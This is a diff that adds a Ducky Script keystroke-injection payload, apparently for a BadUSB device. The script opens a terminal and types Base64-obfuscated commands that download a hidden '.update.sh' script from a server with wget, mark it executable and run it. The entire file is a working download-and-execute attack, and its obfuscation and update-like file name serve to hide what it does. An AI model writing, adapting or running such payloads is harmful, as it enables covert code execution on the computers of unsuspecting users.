@@ -1,0 +1,27 @@
+REM DownloadDelayObfuscated
+REM Open a terminal window
+DELAY 200
+ALT F2
+DELAY 500
+STRING qterminal
+DELAY 200
+ENTER
+
+REM Download the .update.sh payload from the server, encoded in Base64
+DELAY 1500
+STRING echo 'd2dldCAtcSBodHRwOi8vMC4wLjAuMDo4MDAwLy51cGRhdGUuc2g=' | base64 -d | sh
+DELAY 200
+ENTER
+DELAY 200
+
+REM Change the permissions of .update.sh to make it executable, encoded in Base64
+STRING echo 'Y2htb2QgK3ggLnVwZGF0ZS5zaA==' | base64 -d | sh
+DELAY 200
+ENTER
+DELAY 200
+
+REM Run the .update.sh script, encoded in Base64
+STRING echo 'Li8udXBkYXRlLnNo' | base64 -d | sh
+DELAY 200
+ENTER
+DELAY 200
